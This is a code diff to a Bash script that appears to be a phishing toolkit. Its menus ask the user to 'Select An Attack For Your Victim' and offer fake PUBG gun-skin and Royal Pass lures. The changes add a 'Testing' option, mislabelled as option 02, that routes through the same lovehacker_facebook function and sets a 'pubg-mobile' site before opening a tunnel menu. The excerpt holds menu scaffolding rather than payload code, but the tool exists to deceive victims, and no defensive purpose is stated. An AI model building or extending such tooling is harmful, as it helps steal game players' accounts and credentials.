@@ -297,6 +297,7 @@ lovehacker_facebook() {
 
 ${RED}[${WHITE}01${RED}]${ORANGE} link Editor M416		
 ${RED}[${WHITE}02${RED}]${ORANGE} link Editor RoyalPass 17		
+${RED}[${WHITE}02${RED}]${ORANGE} Testing		
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -307,6 +308,10 @@ ${RED}[${WHITE}02${RED}]${ORANGE} link Editor RoyalPass 17
 		tunnel_menu
         elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 	        website="Pubg"
+		mafia404='http://pubg-mobile'
+		tunnel_menu
+        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+	        website="Testing"
 		mafia404='http://pubg-mobile'
 		tunnel_menu
 	else
@@ -322,6 +327,7 @@ main_menu() {
 ${MAGENTA} Select An Attack For Your Victim
 ${RED}[${WHITE}01${RED}] Pubg Gun Skin M416
 ${RED}[${WHITE}02${RED}] Pubg Royal Pass 17
+${RED}[${WHITE}02${RED}] BlackMafia Testing New Project
 ${RED}[${WHITE}99${RED}]${ORANGE} About
 ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -332,6 +338,8 @@ ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		lovehacker_facebook
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
+		lovehacker_facebook
+        elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		lovehacker_facebook
 	elif [[ "$REPLY" == 99 ]]; then
 		about
